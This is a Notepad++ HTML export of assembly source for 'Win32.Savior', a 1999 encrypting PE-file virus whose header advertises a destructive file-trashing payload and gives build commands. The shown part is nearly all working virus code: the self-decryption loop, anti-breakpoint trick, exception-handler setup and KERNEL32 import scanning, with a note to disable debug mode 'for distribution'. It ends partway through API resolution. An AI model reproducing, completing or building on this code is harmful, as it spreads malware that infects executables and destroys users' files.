<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     NAME: Win32.Savior v1.00</span><span class="sc0">
</span><span class="sc1">;     TYPE: Direct-action variable encrypting PE-infector.</span><span class="sc0">
</span><span class="sc1">;     SIZE: Around 1850 bytes.</span><span class="sc0">
</span><span class="sc1">;   AUTHOR: T-2000 / [Immortal Riot].</span><span class="sc0">
</span><span class="sc1">;   E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;     DATE: February 1999.</span><span class="sc0">
</span><span class="sc1">;  PAYLOAD: File-trashing on January 7th.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; CAPABILITIES:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - True Win32-compatible (Win-95/NT).</span><span class="sc0">
</span><span class="sc1">;       - Variable encrypting (32-bit key).</span><span class="sc0">
</span><span class="sc1">;       - Traps possible errors with a SEH.</span><span class="sc0">
</span><span class="sc1">;       - Infects files in Windoze + System-directory.</span><span class="sc0">
</span><span class="sc1">;       - Destructive payload.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As for now only the host's import-table is being searched for GetModule-</span><span class="sc0">
</span><span class="sc1">; HandleA/W and GetProcAddress, this method is fully Win32-compatible though</span><span class="sc0">
</span><span class="sc1">; won't work if the mentioned API's aren't imported. This virus has been</span><span class="sc0">
</span><span class="sc1">; succesfully tested both under Windows-95 and Windows-NT version 4.0.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Dedicated to a painful death on January 7th 1999, you know who you are...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Assemble with: TASM32 SAVIOR.ASM /m /ml</span><span class="sc0">
</span><span class="sc1">;                TLINK32 SAVIOR.OBJ IMPORT32.LIB</span><span class="sc0">
</span><span class="sc1">;                PEWRSEC SAVIOR.EXE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


                </span><span class="sc2">.386</span><span class="sc0">
                </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">FLAT</span><span class="sc0">
                </span><span class="sc9">.CODE</span><span class="sc0">

                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">   </span><span class="sc1">; Hosts need to import these for</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">     </span><span class="sc1">; the virus to be able to spread.</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc1">; Only used by the carrier.</span><span class="sc0">


</span><span class="sc5">Debug_Mode</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; If true, no destruction occurs</span><span class="sc0">
                                        </span><span class="sc1">; and only DUM?.* are infected.</span><span class="sc0">
                                        </span><span class="sc1">; - Switch off for distribution! -</span><span class="sc0">

</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Virus_Size_Mem</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End_Mem</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Max_Infect</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">Min_Size_Infect</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc5">Marker_File</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">666h</span><span class="sc0">


</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Reserve room for EIP.</span><span class="sc0">

                </span><span class="sc6">PUSHFD</span><span class="sc0">                          </span><span class="sc1">; Save registers &amp; flags.</span><span class="sc0">
                </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">               </span><span class="sc1">; Get our location in memory.</span><span class="sc0">

</span><span class="sc5">Anti_Moron</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">                     </span><span class="sc1">; Overlapping code, anti BP.</span><span class="sc0">

</span><span class="sc5">Get_Delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Anti_Moron</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_Key</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_Slide</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">

</span><span class="sc5">Decrypt_DWORD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Virus_Size</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                </span><span class="sc1">; Slide decryption-key.</span><span class="sc0">

                </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Slide key-slider.</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decrypt_DWORD</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">              </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">Encrypted</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">              </span><span class="sc1">; Calculate image-base.</span><span class="sc0">
</span><span class="sc5">Base_Displ</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+((</span><span class="sc5">Carrier</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)+</span><span class="sc2">1000h</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc5">Old_EIP_RVA</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">        </span><span class="sc1">; Set address host in stack.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Setup_SEH</span><span class="sc0">               </span><span class="sc1">; PUSH SEH-address on stack.</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">              </span><span class="sc5">Debug_Mode</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Unhandled exception.</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc9">ELSE</span><span class="sc0">

</span><span class="sc9">%OUT</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WARNiNG</span><span class="sc4">]:</span><span class="sc0"> </span><span class="sc5">NoN</span><span class="sc4">-</span><span class="sc5">DeBuG</span><span class="sc4">-</span><span class="sc5">MoDe</span><span class="sc0">!!

</span><span class="sc9">ENDIF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Restore original stack.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Restore_SEH</span><span class="sc0">             </span><span class="sc1">; Terminate program-flow.</span><span class="sc0">

</span><span class="sc5">Setup_SEH</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Save original SEH-pointer.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">           </span><span class="sc1">; Set our own SEH.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; PE-header.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Import-directory.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Find_K32_Dir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">              </span><span class="sc1">; Reached end of imports?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">JMP_Rest_SEH</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Get module-name.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">           </span><span class="sc1">; Is it KERNEL32.DLL ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Go_Next_Dir</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'23LE'</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Search_Entries</span><span class="sc0">

</span><span class="sc5">Go_Next_Dir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Go to next directory.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Find_K32_Dir</span><span class="sc0">

</span><span class="sc5">Search_Entries</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Array of RVA's.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Initialize 'not found'.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

</span><span class="sc5">Search_Import</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Reached end of array?</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">End_Imports</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Add base.</span><span class="sc0">

</span><span class="sc5">Look_4_GetMod</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSHAD</span><span class="sc0">                          </span><span class="sc1">; GetModuleHandleA/W ?</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Name_GetModuleHandleX</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Search_GM</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Get_Module</span><span class="sc4">-</span><span class="sc5">Unicode_Switch</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'W'</span><span class="sc0">     </span><span class="sc1">; Unicode type?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Store_Switch_W</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">Store_Switch_W</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Unicode_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">POPF</span><span class="sc0">

</span><span class="sc5">Exit_Search_GM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Look_4_GetProc</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

</span><span class="sc5">Look_4_GetProc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSHAD</span><span class="sc0">                          </span><span class="sc1">; GetProcAddress ?</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Name_GetProcAddress</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">

                </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Go_Next_Entry</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

</span><span class="sc5">Go_Next_Entry</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; Next RVA in the array.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Search_Import</span><span class="sc0">

</span><span class="sc5">End_Imports</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Store assumed GetModuleHandle(A/W)-address.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetModuleHandleX</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Store assumed GetProcAddress(A/W)-address.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetProcAddressX</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; GetModuleHandle(A/W) found?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">JMP_Rest_SEH</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">                     </span><span class="sc1">; GetProcAddress(A/W) found?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Init_API</span><span class="sc0">

</span><span class="sc5">JMP_Rest_SEH</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Restore_SEH</span><span class="sc0">             </span><span class="sc1">; Abort all.</span><span class="sc0">

</span><span class="sc5">Init_API</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">API_Names</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">API_Addresses</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Setup_Module</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">                       </span><span class="sc1">; Use Ansi or Unicode ?</span><span class="sc0">
</span><span class="sc5">Unicode_Switch</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                  </span><span class="sc1">; Use Unicode equivalent.</span><span class="sc0">

</span><span class="sc5">Get_Module</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetModuleHandleX</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Terminate when not found.</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">JMP_Rest_SEH</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Save module-base in EBX.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">9</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Start named functions.</span><span class="sc0">

